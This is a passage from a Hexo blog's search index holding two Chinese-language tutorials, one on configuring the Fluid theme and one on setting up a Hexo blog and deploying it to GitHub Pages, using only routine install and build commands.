class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># 导航栏菜单，可自行增减，key 用来关联 languages/*.yml，如不存在关联则显示 key 本身的值；icon 是 css class，可以省略；增加 name 可以强制显示指定名称</span><br> <span class="hljs-comment"># Navigation bar menu. `key` is used to associate languages/*.yml. If there is no association, the value of `key` itself will be displayed; if `icon` is a css class, it can be omitted; adding `name` can force the display of the specified name</span><br> <span class="hljs-attr">menu:</span><br>   <span class="hljs-bullet">-</span> &#123; <span class="hljs-attr">key:</span> <span class="hljs-string">&quot;home&quot;</span>, <span class="hljs-attr">link:</span> <span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-attr">icon:</span> <span class="hljs-string">&quot;iconfont icon-home-fill&quot;</span> &#125;<br>   <span class="hljs-bullet">-</span> &#123; <span class="hljs-attr">key:</span> <span class="hljs-string">&quot;archive&quot;</span>, <span class="hljs-attr">link:</span> <span class="hljs-string">&quot;/archives/&quot;</span>, <span class="hljs-attr">icon:</span> <span class="hljs-string">&quot;iconfont icon-archive-fill&quot;</span> &#125;<br>   <span class="hljs-bullet">-</span> &#123; <span class="hljs-attr">key:</span> <span class="hljs-string">&quot;category&quot;</span>, <span class="hljs-attr">link:</span> <span class="hljs-string">&quot;/categories/&quot;</span>, <span class="hljs-attr">icon:</span> <span class="hljs-string">&quot;iconfont icon-category-fill&quot;</span> &#125;<br>   <span class="hljs-bullet">-</span> &#123; <span class="hljs-attr">key:</span> <span class="hljs-string">&quot;tag&quot;</span>, <span class="hljs-attr">link:</span> <span class="hljs-string">&quot;/tags/&quot;</span>, <span class="hljs-attr">icon:</span> <span class="hljs-string">&quot;iconfont icon-tags-fill&quot;</span> &#125;<br>   <span class="hljs-bullet">-</span> &#123; <span class="hljs-attr">key:</span> <span class="hljs-string">&quot;about&quot;</span>, <span class="hljs-attr">link:</span> <span class="hljs-string">&quot;/about/&quot;</span>, <span class="hljs-attr">icon:</span> <span class="hljs-string">&quot;iconfont icon-user-fill&quot;</span> &#125;<br>   <span class="hljs-comment">#- &#123; key: &quot;links&quot;, link: &quot;/links/&quot;, icon: &quot;iconfont icon-link-fill&quot; &#125;</span><br></code></pre></td></tr></table></figure><h2 id="展示pv与uv统计">2.4 展示PV与UV统计</h2><p>页脚可以展示 PV 与 UV 统计数据，目前支持两种数据来源：<ahref="https://www.leancloud.cn/">LeanCloud</a>与 <ahref="http://busuanzi.ibruce.info/">不蒜子</a>。</p><p>相关<strong>主题配置</strong>如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">footer:</span><br>  <span class="hljs-attr">statistics:</span><br>    <span class="hljs-attr">enable:</span> <span class="hljs-literal">false</span><br>    <span class="hljs-attr">source:</span> <span class="hljs-string">&quot;busuanzi&quot;</span>  <span class="hljs-comment"># 可选 leancloud | busuanzi  根据自己需求选择</span><br>    <span class="hljs-attr">pv_format:</span> <span class="hljs-string">&quot;总访问量 &#123;&#125; 次&quot;</span>  <span class="hljs-comment"># 显示的文本，&#123;&#125;是数字的占位符（必须包含)，下同</span><br>    <span class="hljs-attr">uv_format:</span> <span class="hljs-string">&quot;总访客数 &#123;&#125; 人&quot;</span><br></code></pre></td></tr></table></figure><h2 id="语言配置">2.5 语言配置</h2><p>不同语言会影响一些主题自带的文字。设置语言是在<strong>站点配置</strong>中，需要对应<code>fluid/languages/</code> 目录内的配置文件名:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">language:</span> <span class="hljs-string">zh-CN</span><br></code></pre></td></tr></table></figure><h1 id="首页">3. 首页</h1><h2 id="文章摘要">3.1 文章摘要</h2><p>开关自动摘要（默认开启）：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">index:</span><br>  <span class="hljs-attr">auto_excerpt:</span><br>    <span class="hljs-attr">enable:</span> <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>若要手动指定摘要，使用 <code>&lt;!-- more --&gt;</code>MD文档里划分，如：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown">正文的一部分作为摘要<br>&lt;!-- more --&gt;<br>余下的正文<br></code></pre></td></tr></table></figure><p>或者在 <ahref="https://hexo.io/zh-cn/docs/front-matter">front-matter</a>里设置<code>excerpt</code> 字段，如：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-attr">title:</span> <span class="hljs-string">这是标题</span><br><span class="hljs-attr">excerpt:</span> <span class="hljs-string">这是摘要</span><br><span class="hljs-meta">---</span><br></code></pre></td></tr></table></figure><p>TIP</p><ul><li><p>优先级: 手动摘要 &gt; 自动摘要</p></li><li><p>如果关闭自动摘要，并且没有设置手动摘要，摘要区域空白</p></li><li><p>无论哪种摘要都最多显示 3行，当屏幕宽度不足时会隐藏部分摘要。</p></li></ul><h2 id="文章跳转方式">3.2 文章跳转方式</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># 打开文章的标签方式</span><br>  <span class="hljs-comment"># The browser tag to open the post</span><br>  <span class="hljs-comment"># Available: _blank | _self</span><br>  <span class="hljs-attr">post_url_target:</span> <span class="hljs-string">_self</span><br></code></pre></td></tr></table></figure><h2 id="文章信息">3.3 文章信息</h2><p>可配置隐藏包括发布时间、分类、标签。经过测试，如果首页的文章列表中没有略缩图和摘要，标题+文章信息的显示方式会使页面过于拥挤，所以给出此项配置供喜欢首页只显示文章标题的同学使用。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">index:</span><br>  <span class="hljs-attr">post_meta:</span><br>    <span class="hljs-attr">date:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-attr">category:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-attr">tag:</span> <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><h2 id="隐藏文章">3.4 隐藏文章</h2><p>如果想把某些文章隐藏，<strong>不在首页和其他归档分类页里展示</strong>，可以在文章开头<a href="https://hexo.io/zh-cn/docs/front-matter">front-matter</a>中配置<code>hide: true</code> 属性。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-attr">title:</span> <span class="hljs-string">文章标题</span><br><span class="hljs-attr">index_img:</span> <span class="hljs-string">/img/example.jpg</span><br><span class="hljs-attr">date:</span> <span class="hljs-number">2019-10-10 10:00:00</span><br><span class="hljs-attr">hide:</span> <span class="hljs-literal">true</span><br><span class="hljs-meta">---</span><br><span class="hljs-string">以下是文章内容</span><br></code></pre></td></tr></table></figure><p>隐藏后依然可以通过文章链接访问，所以可以用于一些需要链接跳转的特殊文章。</p><h2 id="归档文章">3.5 归档文章</h2><p>如果只是想让文章在首页隐藏，但仍<strong>需要在归档分类页里展示</strong>，可以在文章开头<a href="https://hexo.io/zh-cn/docs/front-matter">front-matter</a>中配置<code>archive: true</code> 属性。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-attr">title:</span> <span class="hljs-string">文章标题</span><br><span class="hljs-attr">index_img:</span> <span class="hljs-string">/img/example.jpg</span><br><span class="hljs-attr">date:</span> <span class="hljs-number">2019-10-10 10:00:00</span><br><span class="hljs-attr">archive:</span> <span class="hljs-literal">true</span><br><span class="hljs-meta">---</span><br><span class="hljs-string">以下是文章内容</span><br></code></pre></td></tr></table></figure><h2 id="文章排序">3.6 文章排序</h2><p>如果想手动将某些文章固定在首页靠前的位置，可以在安装<code>hexo-generator-index</code> &gt;= 2.0.0 版本的情况下，在文章开头<a href="https://hexo.io/zh-cn/docs/front-matter">front-matter</a>中配置<code>sticky</code> 属性：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-attr">title:</span> <span class="hljs-string">文章标题</span><br><span class="hljs-attr">index_img:</span> <span class="hljs-string">/img/example.jpg</span><br><span class="hljs-attr">date:</span> <span class="hljs-number">2019-10-10 10:00:00</span><br><span class="hljs-attr">sticky:</span> <span class="hljs-number">100</span><br><span class="hljs-meta">---</span><br><span class="hljs-string">以下是文章内容</span><br></code></pre></td></tr></table></figure><p><code>sticky</code>数值越大，该文章越靠前，达到类似于置顶的效果，其他未设置的文章依然按默认排序。</p><p>当文章设置了 <code>sticky</code>后，主题会默认在首页文章标题前增加一个图标，来标识这是一个置顶文章，你可以通过<strong>主题配置</strong>去关闭或修改这个功能：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">index:</span><br>  <span class="hljs-attr">post_sticky:</span><br>    <span class="hljs-attr">enable:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-attr">icon:</span> <span class="hljs-string">&#x27;iconfont icon-top&#x27;</span><br></code></pre></td></tr></table></figure><p><code>icon</code> 可以通过<ahref="https://fluid-dev.github.io/hexo-fluid-docs/icon/">自定义图标</a>修改为其他图标。</p><h1 id="文章页">4. 文章页</h1><h2 id="文章封面图">4.1 文章封面图</h2><p>对于单篇文章，在文章开头 <ahref="https://hexo.io/zh-cn/docs/front-matter">front-matter</a>中配置<code>index_img</code> 属性。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-attr">title:</span> <span class="hljs-string">文章标题</span><br><span class="hljs-attr">tags:</span> [<span class="hljs-string">Hexo</span>, <span class="hljs-string">Fluid</span>]<br><span class="hljs-attr">index_img:</span> <span class="hljs-string">/img/example.jpg</span><br><span class="hljs-attr">date:</span> <span class="hljs-number">2019-10-10 10:00:00</span><br><span class="hljs-meta">---</span><br><span class="hljs-string">以下是文章内容</span><br></code></pre></td></tr></table></figure><p>和 Banner 配置相同，<code>/img/example.jpg</code> 对应的是存放在<code>/source/img/example.jpg</code>目录下的图片（目录也可自定义，但必须在 source 目录下）。</p><p>也可以使用外链 Url 的绝对路径。</p><p>如果想统一给文章设置一个默认图片（文章不设置 <code>index_img</code>则默认使用这张图片），可在<strong>主题配置</strong>中设置：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">post:</span><br>  <span class="hljs-attr">default_index_img:</span> <span class="hljs-string">/img/example.jpg</span><br></code></pre></td></tr></table></figure><p>当 <code>default_index_img</code> 和 <code>index_img</code>都为空时，该文章在首页将不显示图片。</p><h2 id="文章内容图片">4.2 文章内容图片</h2><p>本地图片存放位置同上。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">![](<span class="hljs-link">/img/example.jpg</span>)<br></code></pre></td></tr></table></figure><h2 id="代码块">4.3 代码块</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">code:</span><br>  <span class="hljs-attr">copy_btn:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-attr">highlight:</span><br>    <span class="hljs-attr">enable:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-attr">line_number:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-attr">lib:</span> <span class="hljs-string">&quot;highlightjs&quot;</span><br>    <span class="hljs-attr">highlightjs:</span><br>      <span class="hljs-attr">style:</span> <span class="hljs-string">&#x27;Github Gist&#x27;</span><br>      <span class="hljs-attr">bg_color:</span> <span class="hljs-literal">false</span><br>    <span class="hljs-attr">prismjs:</span><br>      <span class="hljs-attr">style:</span> <span class="hljs-string">&quot;default&quot;</span><br>      <span class="hljs-attr">preprocess:</span> <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p><code>copy_btn</code>: 是否开启复制代码的按钮</p><p><code>line_number</code>: 是否开启行号</p><p><code>highlight</code>: 是否开启代码高亮</p><p><code>lib</code>: 选择生成高亮的库，可选项:<code>highlightjs</code>、<code>prismjs</code>，对应下面两组配置，高亮的配置说明具体见<strong>主题配置</strong>中的注释</p><h2 id="latex-数学公式">4.4 LaTeX 数学公式</h2><ol type="1"><li><p>修改配置文件</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">post:</span><br>  <span class="hljs-attr">math:</span><br>    <span class="hljs-attr">enable:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-attr">specific:</span> <span class="hljs-literal">false</span><br>    <span class="hljs-attr">engine:</span> <span class="hljs-string">mathjax</span><br></code></pre></td></tr></table></figure></li><li><p>更换 Markdown 渲染器(mathjax)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">cnpm uninstall hexo-renderer-marked --save<br>cnpm install hexo-renderer-pandoc --save<br></code></pre></td></tr></table></figure></li><li><p>安装pandoc（需重启电脑）：<ahref="https://github.com/jgm/pandoc/blob/main/INSTALL.md">pandoc/INSTALL.mdat main · jgm/pandoc (github.com)</a></p></li></ol><h1 id="front-matter">5. Front-matter</h1><p>Front-matter 是文件最上方以 <code>---</code>分隔的区域，用于指定个别文件的变量，举例来说：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-attr">title:</span> <span class="hljs-string">Hello</span> <span class="hljs-string">World</span><br><span class="hljs-attr">date:</span> <span class="hljs-number">2013</span><span class="hljs-string">/7/13</span> <span class="hljs-number">20</span><span class="hljs-string">:46:25</span><br><span class="hljs-meta">---</span><br></code></pre></td></tr></table></figure><p>以下是预先定义的参数，您可在模板中使用这些参数值并加以利用。</p><table><thead><tr class="header"><th style="text-align: left;">参数</th><th style="text-align: left;">描述</th><th style="text-align: left;">默认值</th></tr></thead><tbody><tr class="odd"><td style="text-align: left;"><code>layout</code></td><td style="text-align: left;">布局</td><td style="text-align: left;"><ahref="https://hexo.io/zh-cn/docs/configuration#文章"><code>config.default_layout</code></a></td></tr><tr class="even"><td style="text-align: left;"><code>title</code></td><td style="text-align: left;">标题</td><td style="text-align: left;">文章的文件名</td></tr><tr class="odd"><td style="text-align: left;"><code>date</code></td><td style="text-align: left;">建立日期</td><td style="text-align: left;">文件建立日期</td></tr><tr class="even"><td style="text-align: left;"><code>updated</code></td><td style="text-align: left;">更新日期</td><td style="text-align: left;">文件更新日期</td></tr><tr class="odd"><td style="text-align: left;"><code>comments</code></td><td style="text-align: left;">开启文章的评论功能</td><td style="text-align: left;"><code>true</code></td></tr><tr class="even"><td style="text-align: left;"><code>tags</code></td><td style="text-align: left;">标签（不适用于分页）</td><td style="text-align: left;"></td></tr><tr class="odd"><td style="text-align: left;"><code>categories</code></td><td style="text-align: left;">分类（不适用于分页）</td><td style="text-align: left;"></td></tr><tr class="even"><td style="text-align: left;"><code>permalink</code></td><td style="text-align: left;">覆盖文章的永久链接，永久链接应该以<code>/</code> 或 <code>.html</code> 结尾</td><td style="text-align: left;"><code>null</code></td></tr><tr class="odd"><td style="text-align: left;"><code>excerpt</code></td><td style="text-align: left;">纯文本的页面摘要。使用 <ahref="https://hexo.io/zh-cn/docs/tag-plugins#文章摘要和截断">该插件</a>来格式化文本</td><td style="text-align: left;"></td></tr><tr class="even"><td style="text-align: left;"><code>disableNunjucks</code></td><td style="text-align: left;">启用时禁用 Nunjucks 标签<code>&#123;&#123; &#125;&#125;</code>/<code>&#123;% %&#125;</code> 和<a href="https://hexo.io/zh-cn/docs/tag-plugins">标签插件</a>的渲染功能</td><td style="text-align: left;">false</td></tr><tr class="odd"><td style="text-align: left;"><code>lang</code></td><td style="text-align: left;">设置语言以覆盖 <ahref="https://hexo.io/zh-cn/docs/internationalization#路径">自动检测</a></td><td style="text-align: left;">继承自 <code>_config.yml</code></td></tr><tr class="even"><td style="text-align: left;"><code>published</code></td><td style="text-align: left;">文章是否发布</td><td style="text-align: left;">对于 <code>_posts</code> 下的文章为<code>true</code>，对于 <code>_draft</code> 下的文章为<code>false</code></td></tr></tbody></table><h1 id="关于页">6. 关于页</h1><h2 id="创建关于页">6.1 创建关于页</h2><p>首次使用主题的「关于页」需要手动创建：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new page about<br></code></pre></td></tr></table></figure><p>创建成功后修改 <code>/source/about/index.md</code>，添加<code>layout</code> 属性。</p><p>修改后的文件示例如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-attr">title:</span> <span class="hljs-string">标题</span><br><span class="hljs-attr">layout:</span> <span class="hljs-string">about</span><br><span class="hljs-meta">---</span><br><span class="hljs-meta"></span><br><span class="hljs-string">这里可以写正文，支持</span> <span class="hljs-string">Markdown,</span> <span class="hljs-string">HTML</span><br></code></pre></td></tr></table></figure><p>WARNING：<code>layout: about</code>必须存在，并且不能修改成其他值，否则不会显示头像等样式。</p><h2 id="关于信息">6.2 关于信息</h2><p>在关于页介绍自己的基础信息，可以在<strong>主题配置</strong>中设置：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">about:</span><br>  <span class="hljs-attr">avatar:</span> <span class="hljs-string">/img/avatar.png</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">&quot;Fluid&quot;</span><br>  <span class="hljs-attr">intro:</span> <span class="hljs-string">&quot;An elegant theme for Hexo&quot;</span><br></code></pre></td></tr></table></figure><h2 id="社交页图标">6.3 社交页图标</h2><p>在<strong>主题配置</strong>中设置：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">about:</span><br>  <span class="hljs-attr">icons:</span><br>    <span class="hljs-bullet">-</span> &#123; <span class="hljs-attr">class:</span> <span class="hljs-string">&#x27;iconfont icon-github-fill&#x27;</span>, <span class="hljs-attr">link:</span> <span class="hljs-string">&#x27;https://github.com&#x27;</span>, <span class="hljs-attr">tip:</span> <span class="hljs-string">&#x27;GitHub&#x27;</span> &#125;<br>    <span class="hljs-bullet">-</span> &#123; <span class="hljs-attr">class:</span> <span class="hljs-string">&#x27;iconfont icon-douban-fill&#x27;</span>, <span class="hljs-attr">link:</span> <span class="hljs-string">&#x27;https://douban.com&#x27;</span>, <span class="hljs-attr">tip:</span> <span class="hljs-string">&#x27;豆瓣&#x27;</span> &#125;<br>    <span class="hljs-bullet">-</span> &#123; <span class="hljs-attr">class:</span> <span class="hljs-string">&#x27;iconfont icon-wechat-fill&#x27;</span>, <span class="hljs-attr">qrcode:</span> <span class="hljs-string">&#x27;/img/favicon.png&#x27;</span> &#125;<br></code></pre></td></tr></table></figure><ul><li><code>class</code>: 图标的<code>css class</code>，主题内置图标详见<ahref="https://fluid-dev.github.io/hexo-fluid-docs/icon/">这里</a></li><li><code>link</code>: 跳转链接</li><li><code>tip</code>: 鼠标悬浮在图标上显示的提示文字</li><li><code>qrcode</code>:二维码图片，当使用此字段后，点击不再跳转，而是悬浮二维码</li></ul><p>参考教程：</p><ol type="1"><li>https://fluid-dev.github.io/hexo-fluid-docs/guide/</li></ol>]]></content>
    
    
    <categories>
      
      <category>博客搭建</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>快速搭建hexo博客</title>
    <link href="/2023/09/23/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2/"/>
    <url>/2023/09/23/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2/</url>
    
    <content type="html"><![CDATA[<h1 id="前期准备">1. 前期准备</h1><h2 id="安装node.js">1.1 安装Node.js</h2><p>官网链接：https://nodejs.org/en</p><p>安装教程：<ahref="https://blog.csdn.net/WHF__/article/details/129362462?spm=1001.2014.3001.5506">Node.js下载安装及环境配置教程【超详细】_nodejs下载-CSDN博客</a></p><p>npm运行报错解决方案：<ahref="https://blog.csdn.net/weixin_37861326/article/details/104295379?spm=1001.2014.3001.5506">npm运行时报错“因为在此系统上禁止运行脚本”解决办法_npm : 无法加载文件c:files.ps1,因为在此系__cris的博客-CSDN博客</a></p><h2 id="注册github账户">1.2 注册github账户</h2><h2 id="安装hexo">1.3 安装hexo</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cnpm install -g hexo-cli<br></code></pre></td></tr></table></figure><h1 id="快速搭建">2. 快速搭建</h1><h2 id="创建根目录">2.1 创建根目录</h2><p>本地创建一个文件夹，作为博客部署的空间，后续操作均基于该根目录</p><h2 id="初始化">2.2 初始化</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo init<br></code></pre></td></tr></table></figure><h2 id="启动本地服务">2.3 启动本地服务</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo s<br></code></pre></td></tr></table></figure><h2 id="新建文章">2.4 新建文章</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo n <span class="hljs-string">&quot;My first blog&quot;</span><br></code></pre></td></tr></table></figure><h2 id="清理缓存">2.5 清理缓存</h2><p>注：每次无论 <code>hexo g</code> 或 <code>hexo s</code>，都最好先使用<code>hexo clean</code> 清除本地缓存</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo clean<br></code></pre></td></tr></table></figure><h2 id="生成静态文件">2.6 生成静态文件</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo g<br></code></pre></td></tr></table></figure><h1 id="部署到github">3. 部署到github</h1><h2 id="新建仓库">3.1 新建仓库</h2><p>注：命名格式为固定要求</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">账户名<span class="hljs-selector-class">.github</span><span class="hljs-selector-class">.io</span>(例：kaikaikai7<span class="hljs-selector-class">.github</span>.io)<br></code></pre></td></tr></table></figure><h2 id="安装插件">3.2 安装插件</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cnpm install --save hexo-deployer-git<br></code></pre></td></tr></table></figure><h2 id="修改配置文件">3.3 修改配置文件</h2><ol type="1"><li><p>进入根目录下_config.yml文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim _config.yml<br></code></pre></td></tr></table></figure></li><li><p>修改Deployment部分内容</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># Deployment</span><br><span class="hljs-comment">## Docs: https://hexo.io/docs/one-command-deployment</span><br><span class="hljs-attr">deploy:</span><br>  <span class="hljs-attr">type:</span> <span class="hljs-string">git</span><br>  <span class="hljs-attr">repo:</span> <span class="hljs-string">https://github.com/kaikaikai7/kaikaikai7.github.io.git</span><br>  <span class="hljs-attr">branch:</span> <span class="hljs-string">master</span><br></code></pre></td></tr></table></figure></li></ol><h2 id="部署">3.4 部署</h2><p>注：页面结果以本地 <code>hexo s</code>为准，部署后的异常大部分是线上缓存原因，在确认没有报错的情况下，等待若干时间后即可正常</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo d<br></code></pre></td></tr></table></figure><h2 id="访问">3.5 访问</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>账户名.github.io/<br>（例：https:<span class="hljs-regexp">//</span>kaikaikai7.github.io/）<br></code></pre></td></tr></table></figure><h1 id="更换主题">4. 更换主题</h1><h2 id="主题官网">4.1 主题官网</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>hexo.io<span class="hljs-regexp">/themes/</span><br></code></pre></td></tr></table></figure><h2 id="下载主题">4.2 下载主题</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> 主题地址.git themes/目录<br>（例：git <span class="hljs-built_in">clone</span> https://github.com/litten/hexo-theme-yilia.git themes/yilia）<br></code></pre></td></tr></table></figure><h2 id="修改配置文件-1">4.3 修改配置文件</h2><ol type="1"><li><p>进入根目录下_config.yml文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim _config.yml<br></code></pre></td></tr></table></figure></li><li><p>修改Extensions部分内容</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># Extensions</span><br><span class="hljs-comment">## Plugins: https://hexo.io/plugins/</span><br><span class="hljs-comment">## Themes: https://hexo.io/themes/</span><br><span class="hljs-attr">theme:</span> <span class="hljs-string">fluid</span><br></code></pre></td></tr></table></figure></li></ol><p>参考教程：</p><ol type="1"><li>https://www.bilibili.com/video/BV1Yb411a7ty/</li><li><ahref="https://cnhuazhu.top/butterfly/2021/01/21/Hexo快速搭建一个博客/">Hexo快速搭建一个博客| 花猪のBlog (cnhuazhu.top)</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>博客搭建</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
